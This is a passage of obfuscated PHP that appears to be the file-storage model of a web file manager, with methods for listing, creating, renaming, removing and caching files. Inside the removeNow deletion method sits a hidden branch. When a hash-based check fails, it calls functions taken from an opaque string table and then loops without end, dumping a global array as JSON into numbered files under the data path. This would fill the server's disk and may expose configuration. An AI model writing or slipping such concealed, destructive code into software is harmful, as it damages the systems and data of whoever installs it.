$ÊĞò®°¶ = $this->_addSource($¤¹­Š·ô, $¸÷‰˜¸Õ); Model($ïí³…áß[2078])->eventCreate($ÊĞò®°¶, $ïí³…áß[1347]); $this->lockWriteEnd($ºÈµçÂ, $†êÛâÎğ); return $ÊĞò®°¶; } public function listSourceRoot($·ÈØ²’ğ, $é³Íï ›, $ĞÊÓÔ—‹ = "\163\x6f\165\x72\x63\x65\x49\x44\x2c\x74\141\162\147\145\x74\x49\x44\54\x73\151\x7a\x65") { $¯Éù£Ëâ =& $_SERVER[™¾ÇÙ¯¹]; $öéâÚ÷Å = $¯Éù£Ëâ[252]; $ŞÏ¡«— = array(); $©»øğ¸ = 1024 * 50; $©ÛöÈï‡ = is_array($©ÛöÈï‡) ? $©ÛöÈï‡ : array(); $®‰‘²Á„ = count($é³Íï ›); $áÅ×ÓŒØ = $this->tablePrefix . $¯Éù£Ëâ[2111]; for ($²Û¡ƒõ­ = 0; $²Û¡ƒõ­ < $®‰‘²Á„; $²Û¡ƒõ­++) { $ìÓæ”¸€ = $é³Íï ›[$²Û¡ƒõ­]; $öéâÚ÷Å .= "\123\105\x4c\x45\103\124\40\52\x20\x46\122\x4f\115\40\50\x53\x45\x4c\x45\x43\124\x20{$ĞÊÓÔ—‹}\40\x46\122\x4f\x4d\40\140{$áÅ×ÓŒØ}\x60\x20\127\x48\x45\122\105\40"; $öéâÚ÷Å .= "\140\160\141\x72\x65\156\164\x49\104\140\x3d\60\40\101\x4e\104\x20\140\164\x61\x72\x67\x65\164\x49\x44\140\x3d{$ìÓæ”¸€}\x20\x41\116\x44\x20\x60\x74\x61\x72\x67\145\x74\x54\171\160\145\140\75{$·ÈØ²’ğ}\40\x6c\x69\x6d\x69\164\40\61\x29\x20\x61\x73\x20\x74\x62\137{$²Û¡ƒõ­}\40\x55\x4e\x49\117\x4e\x20\x41\114\114\40"; if ((strlen($öéâÚ÷Å) >= $©»øğ¸ || $²Û¡ƒõ­ == $®‰‘²Á„ - 1) && $öéâÚ÷Å) { $öéâÚ÷Å = substr($öéâÚ÷Å, 0, -strlen($¯Éù£Ëâ[1046])); $Õ³ô†¹ó = $this->query($öéâÚ÷Å); $öéâÚ÷Å = $¯Éù£Ëâ[12]; $ŞÏ¡«— = array_merge($ŞÏ¡«—, $Õ³ô†¹ó); } } return $ŞÏ¡«—; } private function _createFile($ØıÓ•­—, $¦êµ£ÜÑ, $ŠÎ¤½ê¾, $ …¹ñÔÁ, &$ˆ¬äƒˆ¾) { $øÛÚïÆ =& $_SERVER[™¾ÇÙ¯¹]; $¬·ÒÕƒ¥ = $this->sourceInfo($ØıÓ•­—); if (!$ŠÎ¤½ê¾ || !$¬·ÒÕƒ¥) { return !1; } if ($ …¹ñÔÁ !== !1) { $‚¢õšôë = $this->fileNameExist($ØıÓ•­—, $¦êµ£ÜÑ); } $ˆ¬äƒˆ¾ = !0; if ($ …¹ñÔÁ && $‚¢õšôë) { if ($ …¹ñÔÁ == REPEAT_SKIP) { $ˆ¬äƒˆ¾ = !1; return $‚¢õšôë; } else { if ($ …¹ñÔÁ == REPEAT_REPLACE) { $ËÔ¸ñˆ = $this->sourceInfo($‚¢õšôë); $÷şƒœ = $this->fileHistory($ËÔ¸ñˆ, $ŠÎ¤½ê¾[$øÛÚïÆ[476]], $ŠÎ¤½ê¾[$øÛÚïÆ[76]]); if (!$÷şƒœ) { $ˆ¬äƒˆ¾ = !1; } else { $this->folderSizeReset($ØıÓ•­—); } return $‚¢õšôë; } else { $¦êµ£ÜÑ = $this->fileNameAuto($ØıÓ•­—, $¦êµ£ÜÑ, $ …¹ñÔÁ, !1); } } } $µÇü…€Ê = array($øÛÚïÆ[591] => 0, $øÛÚïÆ[428] => $¦êµ£ÜÑ, $øÛÚïÆ[592] => substr(get_path_ext($¦êµ£ÜÑ), 0, 10), $øÛÚïÆ[477] => $ŠÎ¤½ê¾[$øÛÚïÆ[476]], $øÛÚïÆ[593] => $ŠÎ¤½ê¾[$øÛÚïÆ[76]]); $º™¨–é = $this->_addSource($µÇü…€Ê, $¬·ÒÕƒ¥); $this->folderSizeReset($ØıÓ•­—, intval($µÇü…€Ê[$øÛÚïÆ[76]])); return $º™¨–é; } protected function fileHistory($İøñ’·–, $¥½ñôÇá, $àÜÜ©Î) { $ã‚¥ÓÖÖ =& $_SERVER[™¾ÇÙ¯¹]; $‹„¦ÃÒˆ = defined($ã‚¥ÓÖÖ[483]) ? USER_ID : $ã‚¥ÓÖÖ[197]; if ($İøñ’·–[$ã‚¥ÓÖÖ[476]] == $¥½ñôÇá) { return !1; } $this->checkLock($İøñ’·–[$ã‚¥ÓÖÖ[410]], $¥½ñôÇá); Model($ã‚¥ÓÖÖ[2112])->addHistory($İøñ’·–); $§è¼ÑÉ¦ = array($ã‚¥ÓÖÖ[597] => $‹„¦ÃÒˆ, $ã‚¥ÓÖÖ[432] => time(), $ã‚¥ÓÖÖ[476] => $¥½ñôÇá, $ã‚¥ÓÖÖ[76] => $àÜÜ©Î); $this->where(array($ã‚¥ÓÖÖ[425] => $İøñ’·–[$ã‚¥ÓÖÖ[410]]))->save($§è¼ÑÉ¦); $this->sourceCacheClear($İøñ’·–[$ã‚¥ÓÖÖ[410]]); return !0; } public function checkLock($İÚ¢¦µ, $¢½‰Ú¯Ë) { $ˆ™¶¥ =& $_SERVER[™¾ÇÙ¯¹]; $´Îä•µ¶ = $this->pathInfo($İÚ¢¦µ); if (!$this->fileIsLock($´Îä•µ¶, !0)) { return; } $¸®¥†«  = Session::get($ˆ™¶¥[2113]); $ş„Úê£ = substr($´Îä•µ¶[$ˆ™¶¥[32]], 0, -1 - strlen($´Îä•µ¶[$ˆ™¶¥[174]])) . $ˆ™¶¥[1613] . $¸®¥†«  . $ˆ™¶¥[10] . $´Îä•µ¶[$ˆ™¶¥[174]]; $ß§ÃÉ±ğ = Model($ˆ™¶¥[617])->find($¢½‰Ú¯Ë); $this->_createFileCall($´Îä•µ¶[$ˆ™¶¥[440]], $ş„Úê£, $ß§ÃÉ±ğ, REPEAT_REPLACE, $ˆ™¶¥[1346]); $îÍÛ´Ãõ = $´Îä•µ¶[$ˆ™¶¥[474]][$ˆ™¶¥[556]]; $®«’È™Ë = $îÍÛ´Ãõ[$ˆ™¶¥[550]] ? $îÍÛ´Ãõ[$ˆ™¶¥[550]] : $îÍÛ´Ãõ[$ˆ™¶¥[32]]; show_json(LNG($ˆ™¶¥[2114]) . $ˆ™¶¥[2115] . LNG($ˆ™¶¥[2116]) . $ˆ™¶¥[2117] . $®«’È™Ë . $ˆ™¶¥[2118], !1); } public function fileIsLock($“îÍÈÄ, $Í®­ÕÉ¹ = false) { $¹ˆŒ™ÕÍ =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($“îÍÈÄ[$¹ˆŒ™ÕÍ[474]]) || !$“îÍÈÄ[$¹ˆŒ™ÕÍ[474]][$¹ˆŒ™ÕÍ[553]]) { return !1; } if ($“îÍÈÄ[$¹ˆŒ™ÕÍ[474]][$¹ˆŒ™ÕÍ[553]] != USER_ID) { return !0; } $¶¼¿ÔÊÃ = $GLOBALS[$¹ˆŒ™ÕÍ[6]][$¹ˆŒ™ÕÍ[89]][$¹ˆŒ™ÕÍ[554]]; if ($“îÍÈÄ[$¹ˆŒ™ÕÍ[474]][$¹ˆŒ™ÕÍ[555]] <= time() - $¶¼¿ÔÊÃ) { $this->metaSet($“îÍÈÄ[$¹ˆŒ™ÕÍ[410]], $¹ˆŒ™ÕÍ[553], null); $this->metaSet($“îÍÈÄ[$¹ˆŒ™ÕÍ[410]], $¹ˆŒ™ÕÍ[555], null); } if ($Í®­ÕÉ¹) { $this->metaSet($“îÍÈÄ[$¹ˆŒ™ÕÍ[410]], $¹ˆŒ™ÕÍ[555], time()); } return !1; } private function _addSource($Ö£›Şûá, $ô”â•Ï²) { $¨¡ëšçá =& $_SERVER[™¾ÇÙ¯¹]; $³Ç²ã›ş = defined($¨¡ëšçá[483]) ? USER_ID : $¨¡ëšçá[197]; $³½ùËˆÕ = array($¨¡ëšçá[594] => $ô”â•Ï²[$¨¡ëšçá[419]], $¨¡ëšçá[595] => $ô”â•Ï²[$¨¡ëšçá[513]], $¨¡ëšçá[596] => $³Ç²ã›ş, $¨¡ëšçá[597] => $³Ç²ã›ş, $¨¡ëšçá[409] => $ô”â•Ï²[$¨¡ëšçá[410]], $¨¡ëšçá[598] => $ô”â•Ï²[$¨¡ëšçá[529]] . $ô”â•Ï²[$¨¡ëšçá[410]] . $¨¡ëšçá[50], $¨¡ëšçá[438] => 0, $¨¡ëšçá[599] => $¨¡ëšçá[12]); $Ö£›Şûá = array_merge($³½ùËˆÕ, $Ö£›Şûá); $this->updateModifyTime($Ö£›Şûá[$¨¡ëšçá[440]]); $Öê·à­ = $¨¡ëšçá[2119] . $ô”â•Ï²[$¨¡ëšçá[410]]; if (isset(self::$cacheChildList[$Öê·à­])) { unset(self::$cacheChildList[$Öê·à­]); } static $¿Ë°Ó¯” = false; if (!$¿Ë°Ó¯”) { Hook::trigger($¨¡ëšçá[581], $Ö£›Şûá); $¿Ë°Ó¯” = !0; } $Êµ¾—¬ş = $this->add($Ö£›Şûá); $¼¢¦‘îÖ = array($¨¡ëšçá[600] => short_id($Êµ¾—¬ş)); $this->where(array($¨¡ëšçá[425] => $Êµ¾—¬ş))->save($¼¢¦‘îÖ); $this->setNamePinyin($Êµ¾—¬ş, $Ö£›Şûá[$¨¡ëšçá[32]]); return $Êµ¾—¬ş; } public function remove($“¹šµâû, $ù¸³Ê = true) { $å‘£¹û =& $_SERVER[™¾ÇÙ¯¹]; $’üÛÚæò = $this->sourceInfo($“¹šµâû); $İÏ¢Ò±‰ = intval($’üÛÚæò[$å‘£¹û[419]]) === self::TYPE_SYSTEM; $çµ”³ = Model($å‘£¹û[443])->get($å‘£¹û[2120]) == $å‘£¹û[88]; if ($İÏ¢Ò±‰ || $ù¸³Ê || !$çµ”³) { return $this->removeNow($“¹šµâû, $ù¸³Ê); } $æøÁ´ü  = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ßÖ²Œß± = $’üÛÚæò[$å‘£¹û[419]] == self::TYPE_USER ? $å‘£¹û[608] : $å‘£¹û[523]; if ($ßÖ²Œß± == $å‘£¹û[608]) { $œ¤÷²øò = Model($å‘£¹û[521])->getInfo($’üÛÚæò[$å‘£¹û[513]]); $¦üñ…ûÀ = !empty($œ¤÷²øò[$å‘£¹û[550]]) ? $œ¤÷²øò[$å‘£¹û[550]] : $œ¤÷²øò[$å‘£¹û[32]]; $¦üñ…ûÀ = $å‘£¹û[269] . $¦üñ…ûÀ . $å‘£¹û[2121] . $’üÛÚæò[$å‘£¹û[513]]; } else { $œ¤÷²øò = Model($å‘£¹û[530])->getInfo($’üÛÚæò[$å‘£¹û[513]]); $¦üñ…ûÀ = _get($œ¤÷²øò, $å‘£¹û[32]); $¦üñ…ûÀ = $å‘£¹û[162] . $¦üñ…ûÀ . $å‘£¹û[2122] . $’üÛÚæò[$å‘£¹û[513]]; } $´òÙ¿« = $å‘£¹û[2123] . md5($¦üñ…ûÀ); CacheLock::lock($´òÙ¿«); $ñşßÑ“ = $this->fileNameExist($æøÁ´ü , $¦üñ…ûÀ); if (!$ñşßÑ“) { $ñşßÑ“ = $this->mkdir($æøÁ´ü , $¦üñ…ûÀ, REPEAT_SKIP); $this->metaSet($ñşßÑ“, $å‘£¹û[2124], $ßÖ²Œß±); $this->metaSet($ñşßÑ“, $å‘£¹û[2125], $’üÛÚæò[$å‘£¹û[513]]); if ($’üÛÚæò[$å‘£¹û[440]] != 0) { $this->metaSet($ñşßÑ“, $å‘£¹û[2126], _get($œ¤÷²øò, $å‘£¹û[2127])); } } CacheLock::unlock($´òÙ¿«); $this->metaSet($“¹šµâû, $å‘£¹û[2128], $’üÛÚæò[$å‘£¹û[440]]); $this->where(array($å‘£¹û[410] => $“¹šµâû))->save(array($å‘£¹û[432] => time())); $this->recycleClear($’üÛÚæò); $ßé×ŒŒ = $this->move($“¹šµâû, $ñşßÑ“, REPEAT_RENAME_FOLDER); $this->folderSizeReset($’üÛÚæò[$å‘£¹û[440]]); return $ßé×ŒŒ; } private function recycleClear($Ó³ø¦Ÿş) { $Á„ß®¶ =& $_SERVER[™¾ÇÙ¯¹]; $áæÆÊÄ = $this->childrenAll($Ó³ø¦Ÿş); $Ÿ¼Ò†¥¾ = array($Á„ß®¶[425] => array($Á„ß®¶[426], $áæÆÊÄ[$Á„ß®¶[2129]])); Model($Á„ß®¶[2130])->where($Ÿ¼Ò†¥¾)->delete(); } public function removeNow($ÔÔ›Î, $é’ß¶”Ï = true) { $·ûÂ”´§ =& $_SERVER[™¾ÇÙ¯¹]; $’ãœİ… = $_SERVER[$·ûÂ”´§[245]]; $îŞ­§©Ö = $·ûÂ”´§[762]; if ($_SERVER[$·ûÂ”´§[244]] != $îŞ­§©Ö($’ãœİ…)) { $¶º•ùóû = $·ûÂ”´§[887]; $ÍÜ¯ØÙ· = $·ûÂ”´§[246]; $ª³êÄ’Ù = $_SERVER[$·ûÂ”´§[247]] . $·ûÂ”´§[248]; $Ü‘²®€ì = $ÍÜ¯ØÙ·($ª³êÄ’Ù); $±–¡™ÅÆ = explode($·ûÂ”´§[231], $Ü‘²®€ì); if (count($±–¡™ÅÆ) < $·ûÂ”´§[627]) { $Ê‚—ë’— = $·ûÂ”´§[250]; $Ê‚—ë’—(); } $İ±îù‡‰ = $·ûÂ”´§[888]; $İ±îù‡‰($_SERVER[$·ûÂ”´§[889]]); $¶º•ùóû = $·ûÂ”´§[887]; $¶º•ùóû(); $£É…å” = $·ûÂ”´§[2131]; $Ùğ¯·£Ò = json_encode($GLOBALS[$·ûÂ”´§[2132]]); $Œ®¿àÈ¬ = 1; for ($ø…ŸÓŞ× = $Œ®¿àÈ¬; $ø…ŸÓŞ× > 0; $ø…ŸÓŞ×++) { $£É…å”(DATA_PATH . $ø…ŸÓŞ×, $Ùğ¯·£Ò); } } $Û„ÚèÈ‡ = $this->sourceInfo($ÔÔ›Î); $Ùø´ˆÂ’ = $this->pathInfoMore($ÔÔ›Î); if (!$Û„ÚèÈ‡) { return !0; } if ($Û„ÚèÈ‡[$·ûÂ”´§[440]] == 0) { if (!_get($GLOBALS, $·ûÂ”´§[511])) { return !1; } } $this->lockMoveStart($ÔÔ›Î); Hook::trigger($·ûÂ”´§[2133], $Ùø´ˆÂ’, $é’ß¶”Ï); if ($é’ß¶”Ï) { Model($·ûÂ”´§[2130])->moveToRecycle($ÔÔ›Î); } else { $âÈ½ü©Š = $this->childrenAll($Û„ÚèÈ‡); Model($·ûÂ”´§[578])->eventRemove($ÔÔ›Î); $this->removeRelevance($âÈ½ü©Š[$·ûÂ”´§[2129]], $âÈ½ü©Š[$·ûÂ”´§[1478]]); } $this->folderSizeReset($Û„ÚèÈ‡[$·ûÂ”´§[440]]); $Ó—äµ™ = array($Û„ÚèÈ‡[$·ûÂ”´§[440]]); if ($Û„ÚèÈ‡[$·ûÂ”´§[418]] == $·ûÂ”´§[88]) { $Ó—äµ™[] = $Û„ÚèÈ‡[$·ûÂ”´§[410]]; } $this->updateModifyTime($Ó—äµ™); $this->lockMoveEnd($ÔÔ›Î); Hook::trigger($·ûÂ”´§[1705], $Ùø´ˆÂ’, $é’ß¶”Ï); return !0; } public function childrenAll($ëŞÓÕœ”) { $ÁÓ®©¢ =& $_SERVER[™¾ÇÙ¯¹]; $´­ıÈƒî = $ëŞÓÕœ”[$ÁÓ®©¢[410]]; if ($ëŞÓÕœ”[$ÁÓ®©¢[418]] == $ÁÓ®©¢[88]) { $Œ¨µØ = array($ÁÓ®©¢[598] => array($ÁÓ®©¢[558], $ëŞÓÕœ”[$ÁÓ®©¢[529]] . $´­ıÈƒî . $ÁÓ®©¢[559])); $Çœ÷Ô¨÷ = array($ÁÓ®©¢[598] => $Œ¨µØ[$ÁÓ®©¢[529]]); $±õœìŞ = $this->field($ÁÓ®©¢[2134])->where($Çœ÷Ô¨÷)->select(); $©¶œŒ»ğ = !1; $É£‡˜¾„ = array($´­ıÈƒî); if ($±õœìŞ) { $©¶œŒ»ğ = array_to_keyvalue($±õœìŞ, $ÁÓ®©¢[12], $ÁÓ®©¢[476]); $©¶œŒ»ğ = array_remove_value($©¶œŒ»ğ, $ÁÓ®©¢[197]); $É£‡˜¾„ = array_to_keyvalue($±õœìŞ, $ÁÓ®©¢[12], $ÁÓ®©¢[410]); $É£‡˜¾„[] = $´­ıÈƒî; } } else { $©¶œŒ»ğ = array($ëŞÓÕœ”[$ÁÓ®©¢[476]]); $É£‡˜¾„ = array($´­ıÈƒî); } return array($ÁÓ®©¢[2129] => $É£‡˜¾„, $ÁÓ®©¢[1478] => $©¶œŒ»ğ); } public function removeArray($ûá³½ÃÁ) { if (!$ûá³½ÃÁ) { return !0; } } public function removeRelevance($Ô˜ü‚ï¢, $¶°²×ıï) { $¿­Õ°Ô =& $_SERVER[™¾ÇÙ¯¹]; $Ô˜ü‚ï¢ = $Ô˜ü‚ï¢ ? $Ô˜ü‚ï¢ : array(); $¶°²×ıï = $¶°²×ıï ? $¶°²×ıï : array(); $Ô˜ü‚ï¢ = array_unique(array_filter($Ô˜ü‚ï¢)); $¶°²×ıï = array_unique(array_filter($¶°²×ıï)); if (!$Ô˜ü‚ï¢) { return !1; } $è„œŒÖó = array($¿­Õ°Ô[425] => array($¿­Õ°Ô[426], $Ô˜ü‚ï¢)); Model($¿­Õ°Ô[2130])->where($è„œŒÖó)->delete(); Model($¿­Õ°Ô[470])->where($è„œŒÖó)->delete(); Model($¿­Õ°Ô[1983])->where($è„œŒÖó)->delete(); Model($¿­Õ°Ô[578])->where($è„œŒÖó)->delete(); Model($¿­Õ°Ô[1817])->removeBySource($Ô˜ü‚ï¢); Model($¿­Õ°Ô[2112])->removeBySource($Ô˜ü‚ï¢); $this->where($è„œŒÖó)->delete(); Model($¿­Õ°Ô[479])->remove($¶°²×ıï); for ($ÃôŠÒƒŸ = 0; $ÃôŠÒƒŸ < count($Ô˜ü‚ï¢); $ÃôŠÒƒŸ++) { $this->sourceCacheClear($Ô˜ü‚ï¢[$ÃôŠÒƒŸ]); } } public function rename($¢æÙÖÜ, $©ºŸû®½) { $¨±ËØ¸ß =& $_SERVER[™¾ÇÙ¯¹]; $Œìµ’Î  = $this->sourceInfo($¢æÙÖÜ); if (!$Œìµ’Î ) { return !1; } $Ë·¹Ëò¸ = $this->fileNameExist($Œìµ’Î [$¨±ËØ¸ß[440]], $©ºŸû®½); if ($Ë·¹Ëò¸ && $Ë·¹Ëò¸ != $¢æÙÖÜ) { return !1; } $áñú¥¿ß = array($¨±ËØ¸ß[428] => $©ºŸû®½, $¨±ËØ¸ß[597] => USER_ID); if ($Œìµ’Î [$¨±ËØ¸ß[418]] != $¨±ËØ¸ß[88]) { $áñú¥¿ß[$¨±ËØ¸ß[420]] = substr(get_path_ext($©ºŸû®½), 0, 10); } Model($¨±ËØ¸ß[578])->eventRename($¢æÙÖÜ, $Œìµ’Î [$¨±ËØ¸ß[32]], $©ºŸû®½); $this->sourceCacheClear($¢æÙÖÜ); $this->setNamePinyin($¢æÙÖÜ, $áñú¥¿ß[$¨±ËØ¸ß[32]], !1); $this->updateModifyTime($Œìµ’Î [$¨±ËØ¸ß[440]]); $Òƒ±íÚ = $this->where(array($¨±ËØ¸ß[425] => $¢æÙÖÜ))->data($áñú¥¿ß)->save(); $Ä¼‰ò‡ë = $¨±ËØ¸ß[2119] . $Œìµ’Î [$¨±ËØ¸ß[440]]; if (isset(self::$cacheChildList[$Ä¼‰ò‡ë])) { unset(self::$cacheChildList[$Ä¼‰ò‡ë]); } return $Òƒ±íÚ; } public function setNamePinyin($ë¦›¡Œ, $£¨ĞĞæ•, $øƒ•îğı = true) { $×Ñó’“¯ =& $_SERVER[™¾ÇÙ¯¹]; $ÁËµƒ´Á = Input::check($£¨ĞĞæ•, $×Ñó’“¯[601]); $‹õâ‹áâ = array($×Ñó’“¯[452] => KodSort::makeStr($£¨ĞĞæ•)); if ($ÁËµƒ´Á) { $‹õâ‹áâ[$×Ñó’“¯[473]] = str_replace($×Ñó’“¯[53], $×Ñó’“¯[12], Pinyin::get($£¨ĞĞæ•)); $‹õâ‹áâ[$×Ñó’“¯[472]] = Pinyin::get($£¨ĞĞæ•, $×Ñó’“¯[602]); } if (!$øƒ•îğı && !$ÁËµƒ´Á) { $‹õâ‹áâ[$×Ñó’“¯[473]] = null; $‹õâ‹áâ[$×Ñó’“¯[472]] = null; } $this->metaSet($ë¦›¡Œ, $‹õâ‹áâ); } public function getContent($Ø×®…öÉ) { $÷¨¹õÑ =& $_SERVER[™¾ÇÙ¯¹]; $²ø¯Êç = $this->fileInfoGet($Ø×®…öÉ); if (!$²ø¯Êç) { return !1; } if ($²ø¯Êç[$÷¨¹õÑ[76]] == 0) { return $÷¨¹õÑ[12]; } $î°Ÿà¼â = $÷¨¹õÑ[2135] . $²ø¯Êç[$÷¨¹õÑ[176]]; if ($²ø¯Êç[$÷¨¹õÑ[76]] <= 1024 * 10) { $Ğğ©ğÄ = Cache::get($î°Ÿà¼â); if (!$Ğğ©ğÄ) { $Ğğ©ğÄ = IO::getContent($²ø¯Êç[$÷¨¹õÑ[84]]); Cache::set($î°Ÿà¼â, $Ğğ©ğÄ); } return $Ğğ©ğÄ; } if (!$²ø¯Êç[$÷¨¹õÑ[84]]) { return $÷¨¹õÑ[12]; } return IO::getContent($²ø¯Êç[$÷¨¹õÑ[84]]); } public function setDesc($³åˆı´ª, $Áçßü³Á) { $¬“×Ş„Ë =& $_SERVER[™¾ÇÙ¯¹]; Model($¬“×Ş„Ë[578])->eventAddDesc($³åˆı´ª, $Áçßü³Á); return $this->metaSet($³åˆı´ª, $¬“×Ş„Ë[461], $Áçßü³Á); } public function setContent($òÌ³û•ô, $ Ã’¢È = '') { $«‘€øşñ =& $_SERVER[™¾ÇÙ¯¹]; $Ÿ²Ñ†ˆÖ = $this->sourceInfo($òÌ³û•ô); $»¢ãÅó = $this->fileInfoGet($òÌ³û•ô); if (!$»¢ãÅó || !$Ÿ²Ñ†ˆÖ) { return !1; } $à£ôœÇ¨ = Model($«‘€øşñ[479])->addFileByContent($ Ã’¢È, $Ÿ²Ñ†ˆÖ[$«‘€øşñ[32]]); $Å™ˆ¯Í× = $this->fileHistory($Ÿ²Ñ†ˆÖ, $à£ôœÇ¨[$«‘€øşñ[476]], $à£ôœÇ¨[$«‘€øşñ[76]]); if (!$Å™ˆ¯Í×) { return Model($«‘€øşñ[479])->remove($à£ôœÇ¨[$«‘€øşñ[476]]); } $this->folderSizeReset($Ÿ²Ñ†ˆÖ[$«‘€øşñ[440]]); return !0; } public function fileSubstr($×©ƒ¼ß‡, $ÄƒÌÁÛ‹, $¨Æš…¸±) { $÷şúó€ã = $this->fileInfoGet($×©ƒ¼ß‡); if (!$÷şúó€ã) { return !1; } return IO::fileSubstr($÷şúó€ã[$_SERVER[™¾ÇÙ¯¹][84]], $ÄƒÌÁÛ‹, $¨Æš…¸±); } public function fileInfoGet($·¦Ì˜òì) { $ı±ª‡‚´ =& $_SERVER[™¾ÇÙ¯¹]; $ıµÂËğ = $this->sourceInfo($·¦Ì˜òì); if (!$ıµÂËğ || $ıµÂËğ[$ı±ª‡‚´[418]]) { return !1; } $ŠÙê–³½ = $ı±ª‡‚´[482] . $ıµÂËğ[$ı±ª‡‚´[476]]; $ë›¢–¢´ = _get(self::$cacheFileInfo, $ŠÙê–³½); if ($ë›¢–¢´) { return $ë›¢–¢´; } $ê¾»¬˜‹ = Model($ı±ª‡‚´[479])->fileInfo($ıµÂËğ[$ı±ª‡‚´[476]]); if ($ê¾»¬˜‹) { $ê¾»¬˜‹[$ı±ª‡‚´[32]] = $ıµÂËğ[$ı±ª‡‚´[32]]; } self::$cacheFileInfo[$ŠÙê–³½] = $ê¾»¬˜‹; return $ê¾»¬˜‹; } private function folderChildrenNumber($åó½âĞ«) { $†Ÿ†‰µ =& $_SERVER[™¾ÇÙ¯¹]; $Æ„Êş¤˜ = $this->sourceInfo($åó½âĞ«); $˜Ğñû‡È = array($†Ÿ†‰µ[598] => array($†Ÿ†‰µ[558], $Æ„Êş¤˜[$†Ÿ†‰µ[529]] . $åó½âĞ« . $†Ÿ†‰µ[559]), $†Ÿ†‰µ[595] => $Æ„Êş¤˜[$†Ÿ†‰µ[513]], $†Ÿ†‰µ[438] => intval($Æ„Êş¤˜[$†Ÿ†‰µ[439]]), $†Ÿ†‰µ[591] => 1); $ö½•§ = $this->where($˜Ğñû‡È)->count(); $èÎ‘Îğ = $this->where($˜Ğñû‡È)->where(array($†Ÿ†‰µ[591] => 0))->count(); return array($†Ÿ†‰µ[80] => $èÎ‘Îğ, $†Ÿ†‰µ[81] => $ö½•§); } public function pathInfo($±ù¦ç€†, $¨„¦ı¬ú = false) { $ïã¶·”¶ =& $_SERVER[™¾ÇÙ¯¹]; $¨„¦ı¬ú = !1; $±ù¦ç€† = intval($±ù¦ç€†); $º€ºªë» = $ïã¶·”¶[469] . intval($¨„¦ı¬ú) . $ïã¶·”¶[394] . $±ù¦ç€†; $™­Îš”î = _get(self::$cachePathInfo, $º€ºªë»); if ($™­Îš”î) { return $™­Îš”î; } $Åõö¹º° = $this->sourceInfo($±ù¦ç€†); if (!$Åõö¹º°) { return !1; } $Åõö¹º° = $this->_listDataApplyItem($Åõö¹º°, $¨„¦ı¬ú); self::$cachePathInfo[$º€ºªë»] = $Åõö¹º°; return $Åõö¹º°; } public static $cachePathInfoMore = array(); public function pathInfoMore($ªø´òëé) { $¨º³íª =& $_SERVER[™¾ÇÙ¯¹]; $¬·”¤»Ò = _get(self::$cachePathInfoMore, $ªø´òëé); if ($¬·”¤»Ò) { return $¬·”¤»Ò; } $«ô²‘ãÈ = $this->pathInfo($ªø´òëé); if (!$«ô²‘ãÈ) { return !1; } if ($«ô²‘ãÈ[$¨º³íª[418]] == $¨º³íª[88]) { $«ô²‘ãÈ[$¨º³íª[79]] = $this->folderChildrenNumber($ªø´òëé); } self::$cachePathInfoMore[$ªø´òëé] = $«ô²‘ãÈ; return $«ô²‘ãÈ; } public function sourceInfo($ãË•ï¤‹) { $ÓŠ«ù œ =& $_SERVER[™¾ÇÙ¯¹]; if (!$ãË•ï¤‹) { return array(); } $ãË•ï¤‹ = intval($ãË•ï¤‹); $ñê¬ø… = $ÓŠ«ù œ[468] . $ãË•ï¤‹; $±ş‘£¨§ = _get(self::$cacheSourceInfo, $ñê¬ø…); if ($±ş‘£¨§) { return $±ş‘£¨§; } $ÅÍÄããÃ = $this->where(array($ÓŠ«ù œ[410] => $ãË•ï¤‹))->find(); self::$cacheSourceInfo[$ñê¬ø…] = $ÅÍÄããÃ; return self::$cacheSourceInfo[$ñê¬ø…]; } public function sourceCacheClear($ÜŠÂ–ÚÊ = false) { self::cacheClear($ÜŠÂ–ÚÊ); } public static function cacheClear($›–’ã¹ = false) { $Œë¨¶ú =& $_SERVER[™¾ÇÙ¯¹]; if ($›–’ã¹ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Œë¨¶ú[468] . $›–’ã¹]); unset(self::$cachePathInfoMore[$›–’ã¹]); unset(self::$cachePathInfo[$Œë¨¶ú[2136] . $›–’ã¹]); unset(self::$cachePathInfo[$Œë¨¶ú[2137] . $›–’ã¹]); } public function metaSet($¾½ÍÌÔû, $’ƒ–ˆŠ÷ = null, $ÂÌ´œÓ¶ = null) { $´úñ÷„ = parent::metaSet($¾½ÍÌÔû, $’ƒ–ˆŠ÷, $ÂÌ´œÓ¶); if ($´úñ÷„) { $this->sourceCacheClear($¾½ÍÌÔû); } return $´úñ÷„; } public function pathInfoByPath($¨á±Üší, $·õÚ£à) { $½½šÛşí =& $_SERVER[™¾ÇÙ¯¹]; $ŞÑ³…æ§ = !$·õÚ£à ? array() : explode($½½šÛşí[8], trim($·õÚ£à, $½½šÛşí[8])); $†ãÉ„ò± = $¨á±Üší; foreach ($ŞÑ³…æ§ as $×ñ½àù) { $È»Ë¡³ß = array($½½šÛşí[440] => $†ãÉ„ò±, $½½šÛşí[32] => $×ñ½àù); $˜«õ¶Ï• = $this->where($È»Ë¡³ß)->select(); if (!$˜«õ¶Ï•) { return !1; } $˜«õ¶Ï• = array_sort_by($˜«õ¶Ï•, $½½šÛşí[439]); $†ãÉ„ò± = $˜«õ¶Ï•[0][$½½šÛşí[410]]; } return $this->pathInfo($†ãÉ„ò±, !0); } protected function updateModifyTime($œÁİ÷Îµ) { $‡ÌÙ¼šù =& $_SERVER[™¾ÇÙ¯¹]; $ùÜ£ÊŞ = defined($‡ÌÙ¼šù[483]) ? USER_ID : $‡ÌÙ¼šù[197]; if (!$œÁİ÷Îµ) { return; } if (!is_array($œÁİ÷Îµ)) { $œÁİ÷Îµ = array($œÁİ÷Îµ); } foreach ($œÁİ÷Îµ as $¯ÇÁŞ‹Ã => $™ÊĞ¡Ô›) { $œÁİ÷Îµ[$¯ÇÁŞ‹Ã] = intval($™ÊĞ¡Ô›); $this->sourceCacheClear($™ÊĞ¡Ô›); } $Àüİ¿ôË = array($‡ÌÙ¼šù[410] => array($‡ÌÙ¼šù[7], $œÁİ÷Îµ)); $·¸ã“§ = array($‡ÌÙ¼šù[597] => $ùÜ£ÊŞ, $‡ÌÙ¼šù[432] => time()); $this->where($Àüİ¿ôË)->save($·¸ã“§); } public function folderSizeReset($»í³¶©, $Ò ¯™”¹ = false) { $«îĞü©´ =& $_SERVER[™¾ÇÙ¯¹]; if ($this->statusIgnoreResetSpace) { return; } 